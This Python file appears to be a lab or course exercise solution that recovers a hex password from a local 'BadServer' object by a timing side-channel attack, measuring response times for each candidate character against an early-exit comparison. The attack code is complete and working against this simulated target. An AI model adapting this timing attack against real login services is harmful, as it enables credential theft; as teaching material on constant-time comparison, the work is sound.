import bad_server
import api
import secrets
from typing import Optional
import time
from itertools import product
from functools import reduce

class Client:
    def __init__(self, remote: bad_server.BadServer):
        self._remote = remote

    def local_verify_password(self, request: api.VerifyRequest) -> api.VerifyResponse:
        fake_password = '37a4e5bf847630173da7e6d19991bb8d'
        try:
            s = request.password
            for i in range(len(fake_password)):
                if len(s) <= i:
                    # print(f"{i}: {s[i]}")
                    return api.VerifyResponse(False)
                elif s[i] != fake_password[i]:
                    # print(f"{i}: {s[i]}")
                    return api.VerifyResponse(False)
                # print(f"{i}: {s[i]}")
            return api.VerifyResponse(True)
        except Exception as e:
            print(e)
            return api.VerifyResponse(False)

    def measure_time(self, password: str, outer_iters = 5, inner_iters=5000) -> float:
        req = api.VerifyRequest(password+"xx")
        times = []
        # warmup
        for _ in range(10):
            self._remote.verify_password(req)
            # self.local_verify_password(req)
        for _ in range(outer_iters):
            start_time = time.time()
            for _ in range(inner_iters):
                self._remote.verify_password(req)
            # self.local_verify_password(req)
            end_time = time.time()
            times.append(end_time - start_time)
        times.sort()
        median = times[outer_iters//2]
        return median

    def get_next_char(self, loc: int, l: int, cur_password: str) -> str:
        hex_chars = "0123456789abcdef"
        measured_times = dict.fromkeys(hex_chars, 0)

        if loc <= 20:
            num_iters = 5000
        elif loc <= 40:
            num_iters = 10000
        else:
            num_iters = 20000
        
        if loc == 2 * l - 1:
            num_iters = 50000

        while True:
            for ch in hex_chars:
                cur_time = self.measure_time(cur_password, inner_iters=num_iters)
                test_password = cur_password + ch
                test_time = self.measure_time(test_password, inner_iters=num_iters)
                t = test_time - cur_time
                measured_times[ch] = t
            
            next_char = max(measured_times, key=measured_times.get)
            sorted_items = sorted(measured_times.items(), key=lambda x: x[1], reverse=True)
            conf = sorted_items[0][1] - sorted_items[1][1]
            conf2 = sorted_items[1][1] - sorted_items[2][1]
            if conf >= conf2 * 3:
                break
        return next_char, measured_times, sorted_items

    def steal_password(self, l: int) -> str:
        passwd = '37a4e5bf847630173da7e6d19991bb8d'
        stolen_password = ''
        for i in range(l * 2):  # Two hex chars for each byte
            next_char, measured_times, candidates = self.get_next_char(i, l, stolen_password)
            stolen_password += next_char
            print(f"true   : {passwd[i]}, measured: {measured_times[passwd[i]]}")
            print(f"candi 0: {candidates[0][0]}, measured: {measured_times[candidates[0][0]]}, conf: {measured_times[candidates[0][0]] - measured_times[candidates[1][0]]}")
            print(f"candi 1: {candidates[1][0]}, measured: {measured_times[candidates[1][0]]}, conf: {measured_times[candidates[1][0]] - measured_times[candidates[2][0]]}")
            print(f"candi 2: {candidates[2][0]}, measured: {measured_times[candidates[2][0]]}, conf: {measured_times[candidates[2][0]] - measured_times[candidates[3][0]]}")
            print()
        return stolen_password

if __name__ == "__main__":
    passwd = '37a4e5bf847630173da7e6d19991bb8d'
    nbytes = len(passwd) // 2
    server = bad_server.BadServer(passwd)
    alice = Client(server)
    stole = alice.steal_password(nbytes)
    print("passwd: ", passwd)
    print("stolen: ", stole)
